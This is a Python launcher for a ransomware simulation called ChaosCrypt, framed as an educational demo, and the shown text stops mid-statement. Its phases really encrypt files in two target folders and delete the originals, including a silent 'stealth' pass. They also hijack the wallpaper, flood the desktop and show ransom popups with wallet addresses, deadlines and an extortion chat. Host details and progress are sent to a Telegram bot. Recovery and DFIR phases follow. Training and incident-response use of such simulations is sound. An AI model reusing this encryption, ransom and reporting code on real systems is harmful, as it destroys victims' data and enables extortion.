import os
import sys
import time
import json
import platform
import subprocess
import webbrowser
import hashlib
import datetime

LAUNCHER_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.dirname(LAUNCHER_DIR)
if ROOT_DIR not in sys.path:
    sys.path.insert(0, ROOT_DIR)

from chaoscrypt.settings import (
    ROOT_DIR, LOG_DIR, ASSETS_DIR, QUARANTINE_DIR,
    SHOW_TARGET_DIR, STEALTH_TARGET_DIR, WATCH_TARGET_DIR,
    RANSOM_NOTE_NAME, RANSOM_QR_NAME, ENCRYPTED_SUFFIX,
    IMG_LOGO_SYSTEM, IMG_LOGO_REPORT, IMG_SUCCESS, IMG_ICO_NAME,
    DECOY_PDF_NAME, LOGFILES, ALL_PHASES, SAFE_MODE,
)
from chaoscrypt.logbook import LogBook

try:
    from chaoscrypt.telegram_notify import (
        send_message, send_photo, send_document, is_ready as tg_ready
    )
except ImportError:
    send_message = None
    send_photo = None
    send_document = None
    tg_ready = lambda: False

BW = 56

def box(text, char="═"):
    print(f"\n  ╔{'═' * BW}╗")
    for line in text.split("\n"):
        print(f"  ║ {line:<{BW - 1}}║")
    print(f"  ╚{'═' * BW}╝")

def phase_header(num, total, title):
    print(f"\n  {'═' * (BW + 2)}")
    print(f"  PHASE {num}/{total}: {title}")
    print(f"  {'═' * (BW + 2)}\n")

def progress_bar(pct, width=30, prefix="", suffix=""):
    filled = int(width * pct / 100)
    bar = "█" * filled + "░" * (width - filled)
    sys.stdout.write(f"\r  [{bar}] {pct:3d}% {prefix} {suffix}   ")
    sys.stdout.flush()

def slow_print(text, delay=0.03):
    for ch in text:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def pause(sec, label=""):
    if label:
        print(f"\n  --- {label} ({sec}s) ---")
    time.sleep(sec)

def tg(text, **kw):
    if send_message:
        send_message(text, parse_mode="HTML", async_mode=True, **kw)

def tg_photo(path, caption="", **kw):
    if send_photo and os.path.isfile(path):
        send_photo(path, caption=caption, parse_mode="HTML",
                   async_mode=False, **kw)

def phase_infection(logger):
    phase_header(1, 6, "INFECTION")

    decoy = os.path.join(ASSETS_DIR, DECOY_PDF_NAME)
    if os.path.isfile(decoy) and os.path.getsize(decoy) > 0:
        try:
            if sys.platform == "win32":
                os.startfile(decoy)
            else:
                subprocess.Popen(
                    ["xdg-open", decoy],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
        except Exception:
            pass
    time.sleep(3)

    box(
        "CHAOSCRYPT ENGINE v3.0\n"
        "Educational Ransomware Simulation\n"
        "\n"
        "Infection Vector: Phishing Email\n"
        "Payload Type:     Encrypted Dropper\n"
        "Target:           Local File System"
    )
    logger.log_event("dropper", "ChaosCrypt launcher started",
                     metadata={"vector": "phishing_pdf", "version": "3.0"})
    tg("🎯 <b>ChaosCrypt: Infection started!</b>\n"
       "<code>Vector: Phishing PDF</code>")
    time.sleep(2)

    print("\n  [DROPPER] Extracting payload from PDF container...\n")
    steps = [
        (13,  "Unpacking..."),
        (27,  "Injecting into process..."),
        (40,  "Installing hooks..."),
        (53,  "Establishing C2..."),
        (67,  "Loading AES-256 module..."),
        (80,  "Scanning targets..."),
        (93,  "Finalizing..."),
        (100, "READY"),
    ]
    for pct, label in steps:
        progress_bar(pct, prefix="|", suffix=label)
        time.sleep(2.0)
    print()

    session_id = hashlib.md5(
        str(time.time()).encode()
    ).hexdigest()[:12].upper()
    ts = datetime.datetime.now(
        datetime.timezone.utc
    ).strftime("%Y-%m-%d %H:%M:%S UTC")

    print(f"\n  [!] Machine compromised.")
    print(f"  [!] Session:   VICTIM-{session_id[:6]}")
    print(f"  [!] Timestamp: {ts}")

    try:
        user = os.getlogin()
    except Exception:
        user = os.environ.get("USERNAME", "unknown")

    logger.log_event("infection", "Machine compromised", metadata={
        "session": session_id, "timestamp": ts,
        "os": platform.platform(), "user": user
    })
    tg(f"🎯 <b>Machine compromised</b>\n"
       f"<code>Session: VICTIM-{session_id[:6]}\n"
       f"OS: {platform.platform()}</code>")

    pause(5, "Infection complete")
    return session_id

def phase_recon(logger, session_id):
    phase_header(2, 6, "RECONNAISSANCE")

    print("  [RECON] Gathering system information...\n")
    time.sleep(1)

    try:
        user = os.getlogin()
    except Exception:
        user = os.environ.get("USERNAME", "unknown")

    info = {
        "OS":        platform.platform(),
        "User":      user,
        "Hostname":  platform.node(),
        "Processor": (platform.processor()[:35] or "N/A"),
        "Python":    platform.python_version(),
    }

    print("  ┌──────────────────────────────────────────────┐")
    for k, v in info.items():
        print(f"  │  {k + ':':<13}{v:<32}│")
    print("  └──────────────────────────────────────────────┘")

    logger.log_event("system_hooks", "System profiled", metadata=info)
    time.sleep(2)

    print("\n  [RECON] Persistence: Registry Run key ADDED (sim)")
    print("  [RECON] Persistence: Scheduled task CREATED (sim)")
    logger.log_event("infection", "Persistence established (simulated)")
    tg(f"🔍 <b>Recon complete</b>\n"
       f"<code>{platform.node()} | {platform.platform()}</code>")

    pause(3, "Recon Phase 1")

    print("\n  ═══════════════════════════════════════════")
    print("  C2 COMMUNICATION")
    print("  ════════════════════════════════��══════════\n")

    print("  [C2] Connecting to command server...")
    time.sleep(1)
    slow_print("  [C2] ........ CONNECTED", 0.08)
    print("  [C2] Beacon interval: 30 sec")
    time.sleep(1)

    print("  [C2] Exfiltrating recon data...")
    for pct in range(0, 101, 10):
        progress_bar(pct, prefix="|", suffix="Uploading...")
        time.sleep(0.3)
    print()
    print("  [C2] Operator received full system profile.")
    print("  [C2] >>> COMMAND RECEIVED: ENCRYPT_ALL")
    logger.log_event("network",
                     "C2 connected, command received: ENCRYPT_ALL")

    pause(3, "C2 Phase")

    print("\n  ═══════════════════════════════════════════")
    print("  TARGET ACQUISITION")
    print("  ═══════════════════════════════════════════\n")

    print("  [AGENT] Scanning for valuable files...\n")
    time.sleep(1)

    targets = {"show": [], "stealth": []}
    skip = (ENCRYPTED_SUFFIX, ".meta", ".bak", ".lock")
    for label, target_dir in [("show", SHOW_TARGET_DIR),
                               ("stealth", STEALTH_TARGET_DIR)]:
        if os.path.isdir(target_dir):
            for fname in os.listdir(target_dir):
                fpath = os.path.join(target_dir, fname)
                if os.path.isfile(fpath) and not any(
                        fname.endswith(e) for e in skip):
                    targets[label].append((fname, os.path.getsize(fpath)))

    def fmt_size(s):
        if s < 1024:
            return f"{s} B"
        if s < 1024 * 1024:
            return f"{s / 1024:.0f} KB"
        return f"{s / 1024 / 1024:.1f} MB"

    print("  [AGENT] Target_Show/:")
    for fname, size in targets["show"]:
        print(f"          {fname:<30} {fmt_size(size):>10}")
    time.sleep(1)

    print("\n  [AGENT] Target_Stealth/:")
    for fname, size in targets["stealth"]:
        print(f"          {fname:<30} {fmt_size(size):>10}")

    total_files = len(targets["show"]) + len(targets["stealth"])
    total_size  = (sum(s for _, s in targets["show"])
                   + sum(s for _, s in targets["stealth"]))
    print(f"\n  [AGENT] Total: {total_files} files "
          f"({fmt_size(total_size)}) — sent to C2.")

    logger.log_event("agent", f"Target scan: {total_files} files",
                     metadata={
                         "show_count": len(targets["show"]),
                         "stealth_count": len(targets["stealth"]),
                         "total_bytes": total_size
                     })
    tg(f"📂 <b>Targets:</b> {total_files} files "
       f"({fmt_size(total_size)})")

    if total_files == 0:
        print("\n  [WARNING] No target files found!")
        print("  [WARNING] Put files in Target_Show/ and Target_Stealth/")
        tg("⚠️ <b>No targets found!</b>")

    pause(5, "Recon complete")
    return targets

def phase_encryption(logger, targets):
    phase_header(3, 6, "ENCRYPTION")

    print("  [!] SHOW    — loud with visual chaos (WannaCry)")
    print("  [!] STEALTH — silent, zero indicators (APT)")
    print()
    slow_print("  Starting in 3... 2... 1...", 0.3)
    time.sleep(1)

    print("\n  --- SHOW PHASE: AES-256-CBC Encryption ---\n")

    from chaoscrypt.encryptor import StreamingEncryptor
    enc_show = StreamingEncryptor(phase="show")
    show_results = []
    show_files = []

    abs_show = os.path.abspath(SHOW_TARGET_DIR)
    skip = (ENCRYPTED_SUFFIX, ".meta", ".bak", ".lock")
    if os.path.isdir(abs_show):
        for fname in sorted(os.listdir(abs_show)):
            fpath = os.path.join(abs_show, fname)
            if (os.path.isfile(fpath)
                    and not any(fname.endswith(e) for e in skip)
                    and fname != RANSOM_NOTE_NAME):
                show_files.append(
                    (fname, fpath, os.path.getsize(fpath))
                )

    if show_files:
        fname, fpath, fsize = show_files[0]
        print(f"  [██░░░░░░░░░░░░░░░░░░░░░░░░░░░░]   7%")
        print(f"  Target:    {fname} ({fsize / 1024:.0f} KB)")
        print(f"  Algorithm: AES-256-CBC")
        print(f"  Key:       256-bit random (os.urandom)")
        print(f"  IV:        128-bit random (unique per file)")
        print(f"  Padding:   PKCS7")
        time.sleep(2)
        print(f"  Status:    Reading... Encrypting... Writing...")
        result = enc_show.encrypt_file(fpath)
        if result:
            show_results.append(result)
        time.sleep(1)
        print(f"\n  {fname} -> {fname}{ENCRYPTED_SUFFIX}")
        print(f"  LOCKED. Original destroyed.\n")
        pause(3)

    for i, (fname, fpath, fsize) in enumerate(show_files[1:], 2):
        pct = int(100 * i / max(len(show_files), 1))
        result = enc_show.encrypt_file(fpath)
        if result:
            show_results.append(result)
        filled = int(30 * pct / 100)
        bar = "█" * filled + "░" * (30 - filled)
        print(f"  [{bar}] {pct:3d}% {fname} -> LOCKED")
        time.sleep(0.5)

    n_show = len(show_results)
    show_key = show_results[0][1] if show_results else "NO_KEY"
    print(f"\n  {n_show} FILES ENCRYPTED. Key sent to C2.")
    logger.log_event("encryption",
                     f"Show: {n_show} files encrypted",
                     metadata={"count": n_show, "key": show_key})
    enc_show.close()
    pause(3)

    print("\n  ═══════════════════════════════════════════")
    print("  CHAOS EFFECTS — VISUAL PAYLOAD")
    print("  ═════════════════════════════════��═════════\n")

    try:
        from chaoscrypt.chaos_effects import ChaosEffects
        fx = ChaosEffects()

        print("  [CHAOS] 🖥️  Wallpaper hijack...")
        fx.wallpaper_hijack()
        pause(5)

        print("  [CHAOS] 📝 Desktop flood...")
        fx.desktop_flood(count=5)
        pause(5)

        print("  [CHAOS] 💀 Console terror...")
        fx.console_terror()
        pause(3)

        print("  [CHAOS] ⏳ Fake encryption progress...")
        fx.fake_encrypt_progress(total_files=30, duration=10)
        pause(1)

        fx.glitch_text(text="YOUR FILES ARE ENCRYPTED",
                       iterations=15)
        pause(2)

        print("  [CHAOS] 🔊 Audio alert...")
        fx.audio_beep(count=5)
        pause(1)

        print("  [CHAOS] 📱 QR popup...")
        fx.qr_popup(key_text="SCAN TO PAY — 0.5 BTC", duration=12)
        pause(1)

        print("  [CHAOS] 💀 Ransom popup...")
        fx.ransom_popup(duration=15)
        pause(1)

        fx.send_infection_photo()
        pause(2)

        if sys.platform == "win32":
            try:
                subprocess.Popen(
                    ["explorer", os.path.abspath(SHOW_TARGET_DIR)]
                )
            except Exception:
                pass
            pause(5, "Check Explorer — .cclab files")

        fx.logger.close()
    except Exception as e:
        print(f"  [CHAOS] Effects error: {e}")
        logger.log_event("error", f"Chaos effects failed: {e}")

    # ═══ STEALTH PHASE (~25 сек) ═══
    print("\n  --- STEALTH PHASE: Silent Attack ---\n")
    print("  [STEALTH] Switching to covert mode...")
    print("  [STEALTH] No wallpaper change.")
    print("  [STEALTH] No ransom notes.")
    print("  [STEALTH] No popups. No sound.")
    print("  [STEALTH] Victim sees NOTHING.")
    pause(3)

    from chaoscrypt.modes.stealth_case import run_stealth_case
    run_stealth_case()

    n_stealth = 0
    if os.path.isdir(STEALTH_TARGET_DIR):
        n_stealth = sum(1 for f in os.listdir(STEALTH_TARGET_DIR)
                        if f.endswith(ENCRYPTED_SUFFIX))

    print(f"\n  [STEALTH] {n_stealth} files encrypted silently.")
    print("  [STEALTH] Victim is UNAWARE.")

    tg(f"🔒 <b>Encryption complete</b>\n"
       f"<code>Show: {n_show} | Stealth: {n_stealth}</code>")
    pause(5, "Encryption complete")
    return show_key, n_show, n_stealth

def phase_ransom(logger, show_key, n_show, n_stealth, session_id):
    phase_header(4, 6, "RANSOM & PAYMENT")

    h_s  = hashlib.md5(session_id.encode()).hexdigest()
    h_e  = hashlib.md5(b"eth" + session_id.encode()).hexdigest()
    h_m  = hashlib.md5(b"xmr" + session_id.encode()).hexdigest()
    btc  = "bc1q7a8h3k2m9p4x5w6y7z8" + h_s[:10]
    eth  = "0x742d35Cc6634C053" + h_e[:16]
    xmr  = "44AFFq5kSiGBoZ4NMDwYtN18obc8" + h_m[:10]
    sid6 = session_id[:6]

    IW = BW
    print()
    print(f"  ╔{'═' * IW}╗")
    print(f"  ║{'CHAOSCRYPT RANSOMWARE':^{IW}}║")
    print(f"  ╠{'═' * IW}╣")
    print(f"  ║{' ' * IW}║")
    print(f"  ║{'Your network has been compromised.':^{IW}}║")
    print(f"  ║{'All files encrypted with AES-256-CBC.':^{IW}}║")
    print(f"  ║{' ' * IW}║")
    print(f"  ║  Victim ID: VICTIM-{sid6}{' ' * (IW - 22 - len(sid6))}║")
    print(f"  ║{' ' * IW}║")
    print(f"  ╠{'═' * IW}╣")
    print(f"  ║{'PAYMENT DETAILS':^{IW}}║")
    print(f"  ╠{'═' * IW}╣")
    print(f"  ║{' ' * IW}║")
    print(f"  ║  Amount: 0.5 BTC (= $21,500){' ' * (IW - 31)}║")
    print(f"  ║{' ' * IW}║")
    btc_line = f"  Bitcoin:  {btc}"
    eth_line = f"  Ethereum: {eth}"
    xmr_line = f"  Monero:   {xmr}"
    print(f"  ║{btc_line:<{IW}}║")
    print(f"  ║{eth_line:<{IW}}║")
    print(f"  ║{xmr_line:<{IW}}║")
    print(f"  ║{' ' * IW}║")
    print(f"  ╠{'═' * IW}╣")
    print(f"  ║  * You have 48 hours to pay{' ' * (IW - 30)}║")
    print(f"  ║  * After 24h the price DOUBLES{' ' * (IW - 33)}║")
    print(f"  ║  * After 48h keys are DESTROYED{' ' * (IW - 34)}║")
    print(f"  ╠{'═' * IW}╣")
    print(f"  ║  Contact: Telegram @chaoscrypt_support{' ' * (IW - 42)}║")
    print(f"  ║  Proof:   We decrypt 1 file for free{' ' * (IW - 40)}║")
    print(f"  ╚{'═' * IW}╝")

    logger.log_event("payment", "Ransom note displayed",
                     metadata={"btc": btc, "amount_btc": 0.5})
    tg("💰 <b>Ransom note displayed</b>\n"
       "<code>0.5 BTC ($21,500)</code>")
    pause(7, "Read the ransom note")

    print("\n  COUNTDOWN TO KEY DESTRUCTION:\n")
    for timestr in ["47:59:59", "40:00:00", "30:00:00", "24:00:00"]:
        hrs = int(timestr.split(":")[0])
        filled = int(30 * hrs / 48)
        bar = "█" * filled + "░" * (30 - filled)
        print(f"  [{bar}] {timestr}")
        time.sleep(2)

    print("\n  !!! PRICE ESCALATION TRIGGERED !!!")
    print("  OLD: 0.5 BTC  ($21,500)")
    print("  NEW: 0.75 BTC ($32,250)  +50%")
    logger.log_event("payment", "Price escalated",
                     metadata={"old": 0.5, "new": 0.75})
    pause(3)

    for timestr in ["12:00:00", "06:00:00", "03:00:00", "00:00:00"]:
        hrs = int(timestr.split(":")[0])
        filled = int(30 * hrs / 48)
        bar = "█" * filled + "░" * (30 - filled)
        tag = "XXX" if hrs == 0 else "!!!"
        print(f"  [{tag}] [{bar}] {timestr}")
        time.sleep(1.5)

    print("\n  DEADLINE REACHED.")
    pause(3)

    print()
    print(f"  ╔{'═' * IW}╗")
    print(f"  ║{'ChaosCrypt Support Chat':^{IW}}║")
    print(f"  ╚{'═' * IW}╝")
    print()

    chat = [
        ("Operator", "We have your files. Pay or lose everything."),
        ("Victim",   "Please, I need my files back..."),
        ("Operator", "We are professionals. Pay and get files."),
        ("Victim",   "Can you lower the price?"),
        ("Operator", "Every hour the price goes up."),
        ("Victim",   "How do I know you'll give the key?"),
        ("Operator", "We exfiltrated data. Payment prevents leak."),
        ("Victim",   "I'm transferring the funds now..."),
        ("Operator", "Final offer: 0.75 BTC. No negotiations."),
        ("Victim",   "Payment sent. Check the wallet."),
    ]
    t_base = datetime.datetime.now().replace(microsecond=0)
    for i, (sender, msg) in enumerate(chat):
        ts = (t_base + datetime.timedelta(seconds=i * 2)
              ).strftime("%H:%M:%S")
        print(f"  [{ts}] {sender}:")
        print(f"  > {msg}")
        time.sleep(1.5)
    logger.log_event("payment", "Negotiation completed")
    pause(3)

    print("\n  [PAYMENT] Opening Payment Portal...")
    portal_duration = 40
    statuses = [
        (0,  "⏳ Awaiting payment..."),
        (8,  "🔍 Scanning blockchain..."),
        (16, "📡 Transaction in mempool..."),
        (24, "⏳ Waiting for confirmations..."),
        (32, "✅ Payment confirmed! Keys ready..."),
        (36, "🔑 Keys delivered."),
    ]

    try:
        import tkinter as tk
        from PIL import Image, ImageTk

        root = tk.Tk()
        root.title("ChaosCrypt Payment Portal")
        root.configure(bg='#0a0a0a')
        root.geometry("500x620")
        root.resizable(False, False)
        root.attributes('-topmost', True)

        ico = os.path.join(ASSETS_DIR, IMG_ICO_NAME)
        if os.path.isfile(ico) and os.path.getsize(ico) > 0:
            try:
                root.iconbitmap(ico)
            except Exception:
                pass

        tk.Label(root, text="CHAOSCRYPT PAYMENT PORTAL",
                 font=("Consolas", 16, "bold"),
                 fg="#ff3333", bg="#0a0a0a").pack(pady=(15, 5))
        tk.Label(root, text=f"Victim ID: VICTIM-{sid6}",
                 font=("Consolas", 10),
                 fg="#888", bg="#0a0a0a").pack()
        tk.Label(root, text="Amount Due: 0.75 BTC (= $32,250)",
                 font=("Consolas", 14, "bold"),
                 fg="#ff9900", bg="#0a0a0a").pack(pady=10)
        tk.Label(root, text=f"Send Bitcoin to:\n{btc}",
                 font=("Consolas", 9), fg="#00ff88",
                 bg="#1a1a1a", relief="sunken",
                 padx=10, pady=5).pack(pady=5, padx=20, fill="x")

        qr_path = os.path.join(ASSETS_DIR, "payment_qr.png")
        if os.path.isfile(qr_path) and os.path.getsize(qr_path) > 0:
            try:
                qi = Image.open(qr_path).resize(
                    (180, 180), Image.LANCZOS)
                qp = ImageTk.PhotoImage(qi)
                ql = tk.Label(root, image=qp, bg="#0a0a0a")
                ql.image = qp
                ql.pack(pady=5)
            except Exception:
                pass

        tk.Label(root,
                 text=f"ETH: {eth[:30]}...\n"
                      f"XMR: {xmr[:30]}...",
                 font=("Consolas", 8), fg="#555",
                 bg="#0a0a0a").pack(pady=3)

        timer_var = tk.StringVar(value="47:59:58")
        tk.Label(root, textvariable=timer_var,
                 font=("Consolas", 20, "bold"),
                 fg="#ff3333", bg="#0a0a0a").pack(pady=5)
        tk.Label(root, text="Price doubles every 24 hours!",
                 font=("Consolas", 9), fg="#ff9900",
                 bg="#0a0a0a").pack()

        status_var = tk.StringVar(value="⏳ Awaiting payment...")
        tk.Label(root, textvariable=status_var,
                 font=("Consolas", 11, "bold"),
                 fg="#ffff00", bg="#1a1a1a",
                 relief="sunken", padx=10,
                 pady=8).pack(pady=10, padx=20, fill="x")

        fake_t = [47 * 3600 + 59 * 60 + 58]

        def tick_timer():
            fake_t[0] -= 1
            h, rm = divmod(fake_t[0], 3600)
            m, s  = divmod(rm, 60)
            timer_var.set(f"{h:02d}:{m:02d}:{s:02d}")
            root.after(1000, tick_timer)

        root.after(1000, tick_timer)
        elapsed = [0]

        def tick_status():
            elapsed[0] += 1
            for sec, txt in reversed(statuses):
                if elapsed[0] >= sec:
                    status_var.set(txt)
                    break
            if elapsed[0] >= portal_duration:
                root.destroy()
                return
            root.after(1000, tick_status)

        root.after(1000, tick_status)
        root.update_idletasks()
        x = (root.winfo_screenwidth() // 2) - 250
        y = (root.winfo_screenheight() // 2) - 310
        root.geometry(f"+{x}+{y}")
        root.mainloop()

    except Exception as e:
        print(f"  [PAYMENT] GUI error: {e}, console fallback...")
        for sec, txt in statuses:
            print(f"  {txt}")
            time.sleep(3)

    tx_hash = hashlib.sha256(session_id.encode()).hexdigest()[:32]
    print(f"\n  Verifying payment on blockchain...")
    print(f"  TX: {tx_hash}...\n")
    for pct, label in [(10,  "Connecting..."),
                        (27,  "Mempool found..."),
                        (43,  "Confirm 1/3..."),
                        (60,  "Confirm 2/3..."),
                        (77,  "Confirm 3/3..."),
                        (100, "VERIFIED")]:
        progress_bar(pct, prefix="|", suffix=label)
        time.sleep(2)
    print()
    print("\n  PAYMENT CONFIRMED. 0.75 BTC. 3/3 confirmations.")
    logger.log_event("payment", "Payment confirmed (simulated)",
                     metadata={"amount": 0.75, "tx": tx_hash})
    pause(2)

    delivered_keys = {"show": {}, "stealth": {}}
    for label, target_dir in [("show", SHOW_TARGET_DIR),
                               ("stealth", STEALTH_TARGET_DIR)]:
        if os.path.isdir(target_dir):
            for fname in os.listdir(target_dir):
                if fname.endswith(ENCRYPTED_SUFFIX + ".meta"):
                    mpath = os.path.join(target_dir, fname)
                    try:
                        with open(mpath, 'r', encoding='utf-8') as f:
                            meta = json.load(f)
                        if meta.get("key_b64"):
                            delivered_keys[label][
                                meta["original_file"]
                            ] = meta["key_b64"]
                    except Exception:
                        pass

    keys_file = os.path.join(LOG_DIR, "delivered_keys.json")
    with open(keys_file, 'w', encoding='utf-8') as f:
        json.dump(delivered_keys, f, indent=2, ensure_ascii=False)

    sk  = list(delivered_keys["show"].values())
    stk = list(delivered_keys["stealth"].values())
    sk_p  = (sk[0][:16]  + "...") if sk  else "N/A"
    stk_p = (stk[0][:16] + "...") if stk else "N/A"
    total_keys = len(sk) + len(stk)

    print(f"\n  DECRYPTION KEYS — VICTIM-{sid6}")
    print(f"  {'═' * IW}")
    print(f"  SHOW:    {sk_p}  | {len(sk)} files  | AES-256-CBC")
    print(f"  STEALTH: {stk_p} | {len(stk)} files | AES-256-CBC")
    print(f"  Saved:   logs/delivered_keys.json")
    pause(2)

    print()
    print(f"  ╔{'═' * IW}╗")
    print(f"  ║{'PAYMENT RECEIPT':^{IW}}║")
    print(f"  ╠{'═' * IW}╣")
    v_line  = f"  Victim:   VICTIM-{sid6}"
    a_line  = f"  Amount:   0.75 BTC ($32,250)"
    s_line  = f"  Status:   CONFIRMED (3/3 blocks)"
    k_line  = f"  Keys:     {total_keys} DELIVERED"
    f_line  = f"  Saved to: logs/delivered_keys.json"
    print(f"  ║{v_line:<{IW}}║")
    print(f"  ║{a_line:<{IW}}║")
    print(f"  ║{s_line:<{IW}}║")
    print(f"  ║{k_line:<{IW}}║")
    print(f"  ║{f_line:<{IW}}║")
    print(f"  ╚{'═' * IW}╝")

    logger.log_event("payment", "Keys delivered",
                     metadata={"keys_file": keys_file})
    tg(f"💰 <b>Payment confirmed! Keys delivered.</b>\n"
       f"<code>0.75 BTC | {total_keys} keys</code>")
    pause(5, "Payment phase complete")
    return keys_file

def phase_recovery(logger, keys_file, session_id):
    phase_header(5, 6, "RECOVERY & REMEDIATION")

    sid6 = session_id[:6]
    print("  [RECOVERY] Loading delivered_keys.json...")
    with open(keys_file, 'r', encoding='utf-8') as f:
        keys_data = json.load(f)
    print("  [RECOVERY] Keys: show, stealth")
    print("  [RECOVERY] Starting decryption...\n")
    time.sleep(2)

    files_to_decrypt = []
    for label, target_dir in [("show", SHOW_TARGET_DIR),
                               ("stealth", STEALTH_TARGET_DIR)]:
        if os.path.isdir(target_dir):
            for fname in sorted(os.listdir(target_dir)):
                if fname.endswith(ENCRYPTED_SUFFIX):
                    files_to_decrypt.append(
                        (label, os.path.join(target_dir, fname), fname)
                    )

    total = len(files_to_decrypt)

    try:
        import tkinter as tk
        from tkinter import ttk

        root = tk.Tk()
        root.title("ChaosCrypt Decryptor")
        root.configure(bg="#0a0a0a")
        root.geometry("620x480")
        root.resizable(False, False)
        root.attributes('-topmost', True)

        ico = os.path.join(ASSETS_DIR, IMG_ICO_NAME)
        if os.path.isfile(ico) and os.path.getsize(ico) > 0:
            try:
                root.iconbitmap(ico)
            except Exception:
                pass

        tk.Label(root, text="CHAOSCRYPT DECRYPTOR",
                 font=("Consolas", 16, "bold"),
                 fg="#00ff88", bg="#0a0a0a").pack(pady=(10, 5))

        status_var = tk.StringVar(
            value="Phase 1/3: Decrypting files...")
        tk.Label(root, textvariable=status_var,
                 font=("Consolas", 11),
                 fg="#ffff00", bg="#0a0a0a").pack(pady=5)

        style = ttk.Style()
        style.theme_use('default')
        style.configure("green.Horizontal.TProgressbar",
                        troughcolor='#1a1a1a',
                        background='#00ff88')
        progress = ttk.Progressbar(
            root, length=540, mode='determinate',
            style="green.Horizontal.TProgressbar")
        progress.pack(pady=10)

        log_text = tk.Text(
            root, height=14, width=72,
            bg="#111111", fg="#00ff88",
            font=("Consolas", 10),
            relief="sunken", state="disabled")
        log_text.pack(pady=5, padx=15)

        def gui_log(msg):
            log_text.config(state="normal")
            log_text.insert("end", msg + "\n")
            log_text.see("end")
            log_text.config(state="disabled")
            root.update()

        recovered = [0]
        failed = [0]

        def decrypt_all():
            from chaoscrypt.encryptor import StreamingEncryptor
            enc = StreamingEncryptor(phase="recovery")

            for i, (pl, fp, fn) in enumerate(files_to_decrypt):
                pct = int(100 * (i + 1) / max(total, 1))
                progress['value'] = pct
                orig = fn.replace(ENCRYPTED_SUFFIX, "")
                ok = enc.decrypt_file(fp)
                if ok:
                    recovered[0] += 1
                    gui_log(f" [{pct:3d}%] {orig} -> RECOVERED ✅")
                else:
                    failed[0] += 1
                    gui_log(f" [{pct:3d}%] {orig} -> FAILED ❌")
                time.sleep(1.2)
            enc.close()

            # Phase 2
            status_var.set("Phase 2/3: Restoring wallpaper...")
            root.update()
            try:
                from chaoscrypt.chaos_effects import ChaosEffects
                cfx = ChaosEffects()
                cfx.wallpaper_restore()
                cfx.logger.close()
            except Exception:
                pass
            gui_log(" Wallpaper restored ✅")
            time.sleep(2)

            status_var.set(
                "Phase 3/3: Cleaning desktop artifacts...")
            root.update()
            try:
                from chaoscrypt.chaos_effects import ChaosEffects
                cfx2 = ChaosEffects()
                cfx2.desktop_cleanup()
                cfx2.logger.close()
            except Exception:
                pass
            gui_log(" Desktop cleaned ✅")
            time.sleep(2)

            status_var.set(
                f"Done! {recovered[0]}/{total} files restored.")
            gui_log(
                f"\n === {recovered[0]}/{total} recovered, "
                f"{failed[0]} failed ===")
            root.after(5000, root.destroy)

        root.after(500, decrypt_all)
        root.update_idletasks()
        x = (root.winfo_screenwidth() // 2) - 310
        y = (root.winfo_screenheight() // 2) - 240
        root.geometry(f"+{x}+{y}")
        root.mainloop()

    except Exception as e:
        print(f"  [RECOVERY] GUI error: {e}, console...")
        from chaoscrypt.encryptor import StreamingEncryptor
        enc = StreamingEncryptor(phase="recovery")
        rc = 0
        for lbl, td in [("show", SHOW_TARGET_DIR),
                         ("stealth", STEALTH_TARGET_DIR)]:
            rc += enc.decrypt_folder(td)
        enc.close()
        print(f"  [RECOVERY] {rc} files recovered.")
        try:
            from chaoscrypt.chaos_effects import ChaosEffects
            cfx = ChaosEffects()
            cfx.wallpaper_restore()
            cfx.desktop_cleanup()
            cfx.logger.close()
        except Exception:
            pass

    IW = BW
    print(f"\n  {'═' * IW}")
    print(f"  VERIFICATION")
    print(f"  {'═' * IW}")
    skip_ext = (ENCRYPTED_SUFFIX, ".meta", ".bak", ".lock")
    for label, target_dir in [("Show", SHOW_TARGET_DIR),
                               ("Stealth", STEALTH_TARGET_DIR)]:
        if os.path.isdir(target_dir):
            for fname in sorted(os.listdir(target_dir)):
                if any(fname.endswith(e) for e in skip_ext):
                    continue
                if fname == RANSOM_NOTE_NAME:
                    continue
                fpath = os.path.join(target_dir, fname)
                if os.path.isfile(fpath):
                    sha = hashlib.sha256(
                        open(fpath, 'rb').read()
                    ).hexdigest()[:12]
                    print(f"  {fname:<30} RESTORED  "
                          f"SHA256 {sha}...")
    print(f"  {'═' * IW}")
    print(f"  Wallpaper: RESTORED | Desktop: CLEAN")

    logger.log_event("recovery", "Full recovery completed")
    tg("🔓 <b>Recovery complete!</b> All files restored.")

    if sys.platform == "win32":
        try:
            subprocess.Popen(
                ["explorer", os.path.abspath(SHOW_TARGET_DIR)])
        except Exception:
            pass

    pause(5, "Recovery complete")


def phase_dfir(logger, session_id, start_time):
    phase_header(6, 6, "DFIR ANALYSIS")

    print("  [DFIR] Analyzing logs, building timeline...\n")
    for pct in range(0, 101, 20):
        progress_bar(pct, prefix="|", suffix="Processing...")
        time.sleep(0.3)
    print("\n")

    html_path = None
    try:
        from chaoscrypt.modes.auto_analyzer import main_pipeline
        html_path, csv_path, json_path = main_pipeline()
        print(f"  HTML: {html_path}")
        print(f"  CSV:  {csv_path}")
        print(f"  JSON: {json_path}")
    except Exception as e:
        print(f"  [DFIR] Report error: {e}")
        logger.log_event("error", f"DFIR report error: {e}")

    if html_path and os.path.isfile(html_path):
        try:
            webbrowser.open(
                f"file://{os.path.abspath(html_path)}")
        except Exception:
            pass

    pause(3, "Reports generated")

    duration = time.time() - start_time
    dur_min  = int(duration // 60)
    dur_sec  = int(duration % 60)
    sid6     = session_id[:6]
    IW       = BW
    dur_str  = f"{dur_min}m {dur_sec}s"

    print()
    print(f"  ╔{'═' * IW}╗")
    print(f"  ║{' ' * IW}║")
    print(f"  ║{'CHAOSCRYPT DEMONSTRATION COMPLETE':^{IW}}║")
    print(f"  ║{' ' * IW}║")
    print(f"  ╠{'═' * IW}╣")
    print(f"  ║{' ' * IW}║")
    print(f"  ║{'Phishing PDF':>{IW // 2}}{' ' * (IW - IW // 2)}║")
    print(f"  ║{'-> Dropper + Persistence':>{IW // 2 + 6}}{' ' * (IW - IW // 2 - 6)}║")
    print(f"  ║{'-> System Recon + C2 Beacon':>{IW // 2 + 9}}{' ' * (IW - IW // 2 - 9)}║")
    print(f"  ║{'-> AES-256-CBC Encryption':>{IW // 2 + 7}}{' ' * (IW - IW // 2 - 7)}║")
    s1 = "    +-- Show Phase (WannaCry)"
    s2 = "    +-- Stealth Phase (APT)"
